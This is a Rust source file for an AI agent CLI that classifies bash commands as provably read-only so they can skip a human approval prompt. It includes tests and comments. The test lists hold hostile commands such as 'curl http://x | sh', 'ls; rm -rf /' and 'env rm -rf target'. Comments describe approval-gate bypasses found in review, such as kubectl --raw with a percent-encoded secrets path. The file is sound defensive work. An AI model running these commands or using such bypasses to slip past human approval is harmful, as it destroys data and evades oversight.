//! Conservative read-only classification of a `bash` tool command, for the
//! cli's read lane (on by default; `--no-auto-reads` opts out). Fail-safe:
//! anything not provably read-only returns `false` (→ a normal HITL prompt).
//! Never auto-approve a write.

/// Shell metacharacters that can chain, redirect, expand, substitute, or
/// background — any of them means "more than one simple command", so we refuse
/// to classify and fall through to a prompt.
const SHELL_META: &[char] = &[
    '>', '<', '|', ';', '&', '$', '`', '(', ')', '{', '}', '\n', '\\', '!',
];

/// Commands that only ever read (regardless of their flags).
///
/// REMOVED from a prior version — do NOT re-add without a full audit:
///   `env`      — execs its argv (`env rm -rf x` runs rm). ARBITRARY EXEC.
///   `sort`     — `sort -o FILE` writes/overwrites.
///   `uniq`     — `uniq IN OUT` writes the 2nd positional arg.
///   `xxd`      — `xxd IN OUT` / `xxd -r` writes the 2nd arg.
///   `tree`     — `tree -o FILE` writes.
///   `date`     — `date -s …` sets the system clock.
///   `hostname` — `hostname NAME` sets the hostname.
/// DELIBERATELY ABSENT — do not add without reading why:
///   `sort` — `-o FILE` overwrites.
///   `tree` — `-o FILE` writes the listing to a file.
///   `env`  — execs its argv.
const READONLY_HEADS: &[&str] = &[
    "cat", "ls", "ll", "pwd", "echo", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg",
    "which", "type", "file", "stat", "du", "df", "realpath", "dirname", "basename", "printenv",
    "whoami", "uname", "cut", "diff", "cmp", "shasum", "md5sum", "od", "nl", "tac", "column",
    "true", "false",
    // Plumbing a poll loop cannot avoid. `sleep` and `seq` touch no bytes at
    // all, and `jq` has no write flag (a `>` is a redirect, and the tokenizer
    // splits on it). They were missing, so one bare `sleep 30` between two
    // `gh pr checks` lifted the whole chain out of the read lane and made
    // every iteration of a CI-watching loop stop for a human.
    //
    // `date` is NOT here: `date -s` sets the system clock. It is handled
    // below, allowed only when it carries no flag that writes.
    "sleep", "seq", "jq",
];

/// `date` flags that only FORMAT. `-s`/`--set` sets the system clock, so the
/// head cannot be allowed outright — but `date +%s` is in every poll loop.
const DATE_READONLY_FLAGS: &[&str] = &[
    "-u",
    "--utc",
    "--universal",
    "-R",
    "--rfc-email",
    "-Iseconds",
];

/// `git` subcommands that only read (regardless of flags). Excludes anything
/// with a write mode (`branch -D`, `tag X`, `remote add`, `config`, `stash`, …).
///
/// REMOVED `reflog` — `git reflog expire/delete` is destructive (prunes the reflog).
const GIT_READONLY_SUBCMDS: &[&str] = &[
    "status",
    "log",
    "diff",
    "show",
    "blame",
    "rev-parse",
    "ls-files",
    "ls-tree",
    "cat-file",
    "describe",
    "shortlog",
    "whatchanged",
    "grep",
];

/// Flags under which `git branch` only LISTS. Any positional argument makes it
/// create a branch (`git branch x`), and `-d/-D/-m/-M/-c/-C/-f/-u` rename,
/// delete, copy or retarget — all absent. `--list` is here but its pattern
/// operand is not: a positional still fails the check, which costs one prompt
/// for `git branch --list 'feat*'` and buys a parser that never has to know
/// which flags take values.
const GIT_BRANCH_LIST_FLAGS: &[&str] = &[
    "--show-current",
    "-a",
    "--all",
    "-r",
    "--remotes",
    "-v",
    "-vv",
    "--verbose",
    "--list",
    "--no-color",
];

/// Flags under which `git remote` only prints the configured remotes. Bare
/// `git remote` lists names. `show`/`update`/`prune` are subcommands, not
/// flags, so they fail the check — `show` and `update` contact the remote,
/// `prune` deletes refs.
const GIT_REMOTE_LIST_FLAGS: &[&str] = &["-v", "--verbose"];

/// Is every remaining token one of `allowed`? No positional operands at all.
fn only_flags<'a>(mut rest: impl Iterator<Item = &'a str>, allowed: &[&str]) -> bool {
    rest.all(|t| allowed.contains(&t))
}

/// `gh` nouns that have a genuine read-only surface (excludes `api` — an
/// arbitrary REST call can write — and `auth`/`secret`/`variable`/`config`,
/// which mix read and mutate verbs under the same noun).
const GH_READONLY_NOUNS: &[&str] = &[
    "pr",
    "issue",
    "repo",
    "run",
    "release",
    "gist",
    "workflow",
    "cache",
    "label",
    "milestone",
    "project",
];

/// Verbs that only read, shared by every `gh` noun above.
const GH_READONLY_VERBS: &[&str] = &["view", "list", "status", "diff", "checks", "watch"];

/// `tea` (Gitea's CLI) nouns and verbs that only read. `tea` as a HEAD is on
/// the egress deny-list in `tool_tier` — `tea pr create` publishes — so this
/// pair of lists is the only thing that keeps `tea pr list` out of a prompt.
/// Verbs are listed rather than nouns-only for the same reason as `gh`: the
/// nouns mix read and mutate under one name (`tea login add`).
const TEA_READONLY_NOUNS: &[&str] = &[
    "pr",
    "pulls",
    "issue",
    "issues",
    "repo",
    "repos",
    "release",
    "releases",
    "milestone",
    "milestones",
    "label",
    "labels",
    "branch",
    "branches",
    "notification",
    "notifications",
    "times",
    "org",
    "orgs",
];
const TEA_READONLY_VERBS: &[&str] = &["list", "ls", "view", "show", "status"];

/// `gh api` flags that turn a GET into a write. `-f/-F/--field/--raw-field`
/// switch the default method to POST; `--input` sends a body; `-X/--method`
/// names one outright. Matched as a prefix so `-XPOST`, `--method=PATCH` and
/// `-fbody=x` are caught without a flag parser.
const GH_API_WRITE_FLAGS: &[&str] = &[
    "-X",
    "--method",
    "-f",
    "-F",
    "--field",
    "--raw-field",
    "--input",
];

/// Is this `gh api …` tail a plain GET? Fail-safe: any write flag, and the
/// `graphql` endpoint (a mutation is a query string away), both prompt.
fn gh_api_is_get<'a>(rest: impl Iterator<Item = &'a str>) -> bool {
    let mut saw_endpoint = false;
    for t in rest {
        if GH_API_WRITE_FLAGS.iter().any(|f| t.starts_with(f)) {
            return false;
        }
        if !t.starts_with('-') && !saw_endpoint {
            if t == "graphql" {
                return false;
            }
            saw_endpoint = true;
        }
    }
    saw_endpoint
}

/// `glab` nouns/verbs, same shape as `gh` above (excludes `api`).
const GLAB_READONLY_NOUNS: &[&str] =
    &["mr", "issue", "repo", "release", "label", "milestone", "ci"];
const GLAB_READONLY_VERBS: &[&str] = &["view", "list", "status", "diff"];

/// Verbs that only read for the container / cluster / package CLIs below.
/// These heads sit on the egress deny-list in `tool_tier` (`docker push`,
/// `kubectl apply`, `npm publish`, `pip install` all move bytes or change
/// state), so without an explicit read allowlist `docker ps` was classed
/// `NetworkEgress` — above the auto ceiling — and prompted in an auto session
/// (#1878). Same shape as `gh`: head + the VERB directly after it, nothing
/// else. A flag in the verb slot (`docker -H tcp://host ps`, `kubectl
/// --context prod get`) fails the check and keeps asking, which costs a prompt
/// and buys a parser that never has to know which flags take values.
const DOCKER_READONLY_VERBS: &[&str] = &["ps", "images", "logs", "inspect", "version", "info"];
const KUBECTL_READONLY_VERBS: &[&str] = &["get", "describe", "logs", "top", "version"];
const NPM_READONLY_VERBS: &[&str] = &["ls", "list", "outdated"];
const PIP_READONLY_VERBS: &[&str] = &["list", "show", "freeze"];

/// Does the read lane cover this tool call?
///
/// The single definition of the lane, shared by the interactive TUI and plain
/// mode — they used to disagree, with plain mode ignoring the flag
/// entirely, so the same flag meant different things depending on how you
/// started the CLI.
///
/// `read_file` is read-only by construction: a dedicated read tool, enforced
/// by the sandbox's read entitlements. `bash` has to prove it with
/// [`is_readonly_bash`]. Everything else prompts.
pub fn is_readonly_call(tool_name: &str, tool_input: Option<&serde_json::Value>) -> bool {
    match tool_name {
        "read_file" => true,
        "bash" => tool_input
            .and_then(|v| v.get("command"))
            .and_then(serde_json::Value::as_str)
            .is_some_and(is_readonly_bash),
        _ => false,
    }
}

pub fn is_readonly_bash(cmd: &str) -> bool {
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    // Raw text: nothing has been parsed, so a metacharacter anywhere could be
    // live shell syntax. Refuse and let the caller prompt.
    if cmd.contains(SHELL_META) {
        return false; // not a single simple command — fail-safe
    }
    let words: Vec<(&str, bool)> = cmd.split_whitespace().map(|w| (w, false)).collect();
    is_readonly_words(&words)
}

/// The same decision for ONE simple command a real tokenizer already split and
/// unquoted, each word paired with whether it came from quotes.
///
/// Why this exists: a quoted argument is DATA, not syntax. `jq -r '"m=\(.x)"'`
/// never hands the shell a `(` to interpret, so re-running the raw-text
/// metacharacter guard over the re-joined words rejects the commonest read
/// shape in a review session. Only UNQUOTED words get that guard here; the
/// caller's tokenizer has already refused the expansions a quoted string can
/// still trigger (`$(…)`, backticks) and split on every real operator.
pub fn is_readonly_words(words: &[(&str, bool)]) -> bool {
    if words
        .iter()
        .any(|(t, quoted)| !quoted && t.contains(SHELL_META))
    {
        return false; // an operator the tokenizer handed through — fail-safe
    }
    let whole = words.iter().map(|(t, _)| *t).collect::<Vec<_>>().join(" ");
    let cmd = whole.as_str();
    let mut toks = words.iter().map(|(t, _)| *t);
    let Some(head) = toks.next() else {
        return false;
    };
    match head {
        // `find` reads UNLESS it deletes or executes.
        "find" => {
            // find can WRITE with -delete, the -exec/-ok family (runs commands),
            // and the -fprint/-fprintf/-fls family (writes the match list to a
            // file). The -exec/-ok substring also catches -execdir/-okdir.
            const FIND_WRITE: &[&str] = &[
                "-delete", "-exec", "-ok", "-fprint", "-fprintf", "-fls", "-fprint0",
            ];
            !FIND_WRITE.iter().any(|w| cmd.contains(w))
        }
        // `git` only for a fixed read-only subcommand set, plus the two
        // subcommands whose read and write modes share a name (`branch`,
        // `remote`) — those only when EVERY argument is a known listing flag.
        "git" => match toks.next() {
            Some("branch") => only_flags(toks, GIT_BRANCH_LIST_FLAGS),
            Some("remote") => only_flags(toks, GIT_REMOTE_LIST_FLAGS),
            Some(sub) => GIT_READONLY_SUBCMDS.contains(&sub),
            None => false,
        },
        // `gh`/`glab` only for a fixed noun + read verb pair — `gh pr view`,
        // `gh issue list`, never `gh api` (arbitrary REST, can write) or the
        // auth/secret/config nouns that mix read and mutate under one name.
        "gh" => {
            let noun = toks.next();
            if noun == Some("api") {
                return gh_api_is_get(toks);
            }
            let verb = toks.next();
            noun.is_some_and(|n| GH_READONLY_NOUNS.contains(&n))
                && verb.is_some_and(|v| GH_READONLY_VERBS.contains(&v))
        }
        "glab" => {
            let noun = toks.next();
            let verb = toks.next();
            noun.is_some_and(|n| GLAB_READONLY_NOUNS.contains(&n))
                && verb.is_some_and(|v| GLAB_READONLY_VERBS.contains(&v))
        }
        // `tea` reads only for a fixed noun + verb pair. A bare `tea pr` opens
        // an interactive prompt and `tea pr create` publishes, so both fail
        // here and are caught by the egress deny-list instead.
        "tea" => {
            let noun = toks.next();
            let verb = toks.next();
            noun.is_some_and(|n| TEA_READONLY_NOUNS.contains(&n))
                && verb.is_some_and(|v| TEA_READONLY_VERBS.contains(&v))
        }
        // Container / cluster / package CLIs: a fixed read verb, directly after
        // the head. `kubectl get secret(s)` is refused outright — the lane
        // exists for status checks, and a secret's value is not one.
        "docker" => toks
            .next()
            .is_some_and(|v| DOCKER_READONLY_VERBS.contains(&v)),
        "kubectl" => {
            let verb = toks.next();
            verb.is_some_and(|v| KUBECTL_READONLY_VERBS.contains(&v))
                && !toks.any(|t| {
                    t.to_ascii_lowercase().contains("secret")
                        || kubectl_selects_from_file(t)
                        || kubectl_unsafe_long_flag(t)
                })
        }
        "npm" => toks.next().is_some_and(|v| NPM_READONLY_VERBS.contains(&v)),
        "pip" | "pip3" => {
            toks.next().is_some_and(|v| PIP_READONLY_VERBS.contains(&v))
                && !toks.any(pip_writes_log_file)
        }
        // `date` prints unless it SETS. `+FORMAT` is the read form. A bare
        // positional is NOT allowed: on BSD `date 010203` sets the clock
        // without any flag at all, so an allowlist of two shapes is the only
        // safe read of this head.
        "date" => toks.all(|t| t.starts_with('+') || DATE_READONLY_FLAGS.contains(&t)),
        other => READONLY_HEADS.contains(&other),
    }
}

/// True when a `kubectl` argument selects resources from a manifest file or
/// directory (`-f`, `--filename`, `-k`, `--kustomize`, attached-value forms,
/// and short-flag clusters such as `-Rf`). The manifest can name a Secret by
/// `kind` and `metadata.name`, so no command-line token need contain
/// "secret"; the contents are not inspected, so the call is not provably a
/// status check. A false positive only costs a prompt.
fn kubectl_selects_from_file(tok: &str) -> bool {
    let name = kubectl_flag_name(tok);
    if let Some(long) = name.strip_prefix("--") {
        return long == "filename" || long == "kustomize";
    }
    match name.strip_prefix('-') {
        // pflag reads a short cluster left to right until it meets a flag
        // that takes a value, so `-fFILE`, `-Rf`, and `-Rf./x` all select a
        // manifest. Any `f`/`k` in the cluster is refused: a value attached
        // to an earlier flag that happens to contain one only costs a prompt.
        Some(short) if !short.is_empty() => short.contains(['f', 'k']),
        _ => false,
    }
}

/// True when a `kubectl` argument is one of [`KUBECTL_UNSAFE_LONG_FLAGS`].
fn kubectl_unsafe_long_flag(tok: &str) -> bool {
    KUBECTL_UNSAFE_LONG_FLAGS.contains(&kubectl_flag_name(tok).as_str())
}

/// The flag name of a `kubectl` argument as kubectl sees it: text before
/// `=`, with `_` folded to `-` (kubectl installs pflag's
/// `WordSepNormalizeFunc`, so `--cache_dir` IS `--cache-dir`).
fn kubectl_flag_name(tok: &str) -> String {
    tok.split('=').next().unwrap_or(tok).replace('_', "-")
}

/// Long flags refused in the kubectl read lane, matched bare or `=VALUE`.
/// `--raw` fetches an arbitrary API path that client-go percent-decodes
/// (`%73ecrets`), defeating the "secret" token check; the rest write to a
/// caller-chosen path (`--profile` alone writes `profile.pprof`).
const KUBECTL_UNSAFE_LONG_FLAGS: &[&str] = &[
    "--raw",
    "--profile",
    "--profile-output",
    "--cache-dir",
    "--log-file",
    "--log-dir",
];

/// True when a `pip` argument is `--log` (or an unambiguous prefix optparse
/// would expand to it, e.g. `--lo` for `pip show`), with or without `=PATH`.
/// `--log PATH` creates or appends to a file, so the call is not read-only.
fn pip_writes_log_file(tok: &str) -> bool {
    let name = tok.split('=').next().unwrap_or(tok);
    name.len() >= 3 && "--log".starts_with(name)
}

#[cfg(test)]
mod tests {
    use super::{is_readonly_bash, is_readonly_call};

    /// The lane both the TUI and plain mode ask. `read_file` rides on the
    /// sandbox's read entitlement; `bash` still has to prove itself; anything
    /// that could write must prompt no matter which mode is running.
    #[test]
    fn readonly_call_covers_read_file_and_proven_bash_only() {
        let cmd = |c: &str| serde_json::json!({ "command": c });

        assert!(is_readonly_call("read_file", None));
        assert!(is_readonly_call("bash", Some(&cmd("git status"))));

        assert!(!is_readonly_call("bash", Some(&cmd("rm -rf /"))));
        assert!(!is_readonly_call("bash", Some(&cmd("cat a > b"))));
        assert!(
            !is_readonly_call("bash", None),
            "no command => cannot prove"
        );
        assert!(!is_readonly_call("write_file", None));
        assert!(!is_readonly_call("edit", Some(&cmd("git status"))));
    }

    /// #1878: read verbs of the egress-headed CLIs must not prompt in an auto
    /// session, and their write verbs must still stop.
    #[test]
    fn container_and_package_read_verbs_are_read_only() {
        for c in [
            "docker ps",
            "docker ps -a",
            "docker images",
            "docker logs web",
            "docker inspect web",
            "kubectl get pods",
            "kubectl get pods -n x -o wide",
            "kubectl describe pod x",
            "kubectl logs x",
            "npm ls",
            "npm list --depth=0",
            "pip list",
            "pip3 show requests",
            "pip freeze",
        ] {
            assert!(is_readonly_bash(c), "{c} should be read-only");
        }
        for c in [
            "docker push img",
            "docker run img",
            "docker rm web",
            "docker exec web ls",
            "docker -H tcp://h:2375 ps",
            "docker",
            "kubectl apply -f x.yaml",
            "kubectl delete pod x",
            "kubectl exec x -- ls",
            "kubectl get secret x -o yaml",
            "kubectl get secrets",
            "kubectl --context prod get pods",
            // Manifest / directory selection can name a Secret indirectly.
            "kubectl get -f resource.yaml -o yaml",
            "kubectl get -fresource.yaml",
            "kubectl get --filename resource.yaml",
            "kubectl get --filename=resource.yaml",
            "kubectl get -Rf dir",
            "kubectl describe -f resource.yaml",
            "kubectl get -k overlay/",
            "kubectl get -kdir",
            "kubectl get --kustomize overlay/",
            "kubectl get --kustomize=overlay/",
            // pflag splits `-Rf./x` into `-R` + `-f ./x`: a cluster with an
            // attached value still selects from a manifest.
            "kubectl get -Rf./resource.yaml -o yaml",
            "kubectl describe -Rf./resource.yaml",
            "kubectl get -Rk./overlay",
            // `--profile-output` creates or truncates a file.
            "kubectl version --client --profile=cpu --profile-output=./out.prof",
            "kubectl get pods --profile cpu --profile-output ./out.prof",
            "kubectl version --profile=cpu",
            // `--raw` takes a URL whose path client-go percent-decodes, so
            // `%73ecrets` reaches the Secret API with no "secret" token.
            "kubectl get --raw=/api/v1/namespaces/default/%73ecrets",
            "kubectl get --raw /api/v1/namespaces/default/%73ecrets/x",
            // Flags that write to a caller-chosen path.
            "kubectl get pods --cache-dir ./cache",
            "kubectl get pods --cache-dir=./cache",
            "kubectl get pods --log-file=./k.log",
            "kubectl get pods --log-dir ./logs",
            // kubectl folds `_` to `-` in flag names.
            "kubectl version --client --profile_output=./out.prof",
            "kubectl version --client --profile_output ./out.prof",
            "kubectl get pods --cache_dir=./cache",
            "kubectl get pods --cache_dir ./cache",
            "kubectl get pods --log_file=./k.log",
            "kubectl get pods --log_file ./k.log",
            "kubectl get pods --log_dir ./logs",
            "kubectl get pods --log_dir=./logs",
            // `pip --log` writes a file.
            "pip list --log ./pip-session.log",
            "pip list --log=./pip-session.log",
            "pip3 freeze --log ./x.log",
            "pip3 show requests --log=./x.log",
            "pip show requests --lo ./x.log",
            "npm publish",
            "npm install",
            "npm run build",
            "pip install x",
            "pip download x",
        ] {
            assert!(!is_readonly_bash(c), "{c} must NOT be read-only");
        }
    }

    #[test]
    fn auto_approves_plain_read_commands() {
        for c in [
            "cat Cargo.toml",
            "ls",
            "ls -la src/",
            "grep -rn foo src/",
            "rg TODO",
            "head -50 file.rs",
            "wc -l *.rs",
            "find . -name '*.rs'",
            "git status",
            "git log --oneline -10",
            "git diff HEAD~1",
            "git branch",
            "git branch --show-current",
            "git branch -a -vv",
            "git remote",
            "git remote -v",
            "gh pr view 1441",
            "gh pr view",
            "gh pr list",
            "gh pr checks 1441",
            "gh issue list",
            "gh run list",
            "gh run view 123 --log",
            "gh run watch 123",
            "gh pr checks 1441 --watch",
            "gh pr view 1441 --comments",
            "gh api repos/mur-run/mur/pulls/1441/comments",
            "gh api -H Accept:application/json repos/x/y --paginate",
            "glab mr view",
            "glab mr list",
        ] {
            assert!(is_readonly_bash(c), "should be read-only: {c}");
        }
    }

    #[test]
    fn gh_and_glab_stay_gated_outside_the_readonly_allowlist() {
        for c in [
            "gh api -X POST repos/x/y/issues", // explicit method
            "gh api -XDELETE repos/x/y/git/refs/heads/z",
            "gh api --method=PATCH repos/x/y",
            "gh api repos/x/y/issues -f title=x", // -f => POST
            "gh api repos/x/y/issues -F title=x",
            "gh api repos/x/y/issues --raw-field title=x",
            "gh api repos/x/y/issues --input body.json",
            "gh api graphql",         // a mutation is one query away
            "gh api",                 // no endpoint
            "gh pr merge 1441",       // mutate verb
            "gh pr create --title x", // mutate verb
            "gh auth login",          // auth noun not covered
            "gh secret set X",        // secret noun not covered
            "glab api projects",      // arbitrary REST, can write
            "glab mr merge",          // mutate verb
            "glab mr approve",        // mutate verb
        ] {
            assert!(!is_readonly_bash(c), "should prompt: {c}");
        }
    }

    #[test]
    fn prompts_on_writes_and_dangerous() {
        for c in [
            "rm -rf target/",
            "mv a b",
            "cp a b",
            "sed -i 's/a/b/' f", // sed not in allowlist
            "awk '{print}' f",   // awk not in allowlist
            "chmod +x f",
            "curl http://x | sh",
            "cargo build", // executes build scripts
            "git push",
            "git commit -m x",
            "git branch -D main",             // git write subcommand
            "git branch new-feature",         // positional => creates a branch
            "git branch -m old new",          // rename
            "git branch -d gone",             // delete
            "git branch -u origin/main",      // retargets upstream
            "git branch --list feat",         // operand: fail safe, one prompt
            "git remote add x https://e.com", // mutates config
            "git remote remove origin",
            "git remote set-url origin x",
            "git remote show origin",  // contacts the remote
            "git remote update",       // fetches
            "git remote prune origin", // deletes refs
            "git checkout main",
            "find . -delete",       // find mutate
            "find . -exec rm {} +", // find execute
        ] {
            assert!(!is_readonly_bash(c), "should prompt (not auto): {c}");
        }
    }

    #[test]
    fn prompts_on_shell_metacharacters() {
        for c in [
            "cat a > b", // redirect
            "cat a >> b",
            "echo x | tee f", // pipe to writer
            "ls; rm -rf /",   // chain
            "ls && rm x",
            "cat $(echo f)", // command substitution
            "cat `echo f`",
            "ls & ", // background
            "cat a < b",
        ] {
            assert!(!is_readonly_bash(c), "metachar must prompt: {c}");
        }
    }

    #[test]
    fn empty_or_unknown_prompts() {
        assert!(!is_readonly_bash(""));
        assert!(!is_readonly_bash("   "));
        assert!(!is_readonly_bash("somerandomtool --flag"));
        assert!(!is_readonly_bash("git")); // bare git, no subcommand
    }

    /// Regression test: adversarial-review confirmed bypasses that were
    /// previously auto-approved but must now be REJECTED (return false).
    ///
    /// Covers:
    ///   - `env` as arbitrary exec (7 cases)
    ///   - `sort -o` write output (2 cases)
    ///   - `uniq` 2-positional-arg write (1 case)
    ///   - `xxd` write / reverse (2 cases)
    ///   - `tree -o` write (1 case)
    ///   - `find` -fprint/-fls/-fprintf write (3 cases)
    ///   - `git reflog expire` destructive (1 case)
    ///   - `date -s` clock mutation (1 case)
    ///   - `hostname NAME` hostname mutation (1 case)
    #[test]
    fn rejects_plain_arg_write_and_exec_bypasses() {
        let bypasses = [
            "env rm -rf target",
            "env FOO=bar rm -rf x",
            "sort -o victim.txt in.txt",
            "sort in.txt -o in.txt",
            "uniq in.txt out.txt",
            "xxd Cargo.toml dump.bin",
            "xxd -r hex.txt restored.bin",
            "tree -o listing.html",
            "find . -fprint /tmp/out",
            "find . -fls /tmp/out",
            "find . -fprintf /tmp/o %p",
            "git reflog expire --expire=now --all",
            "date -s 2020-01-01",
            "hostname evil-host",
        ];
        for c in bypasses {
            assert!(
                !is_readonly_bash(c),
                "bypass must be rejected (was wrongly auto-approved): {c}"
            );
        }

        // Confirm the still-allowed reads continue to pass.
        let still_reads = [
            "cat Cargo.toml",
            "ls -la src/",
            "grep -rn foo src/",
            "git status",
            "git log --oneline -10",
            "find . -name '*.rs'",
            "printenv PATH",
            "whoami",
            "uname -a",
        ];
        for c in still_reads {
            assert!(
                is_readonly_bash(c),
                "read-only command should still pass: {c}"
            );
        }
    }
}
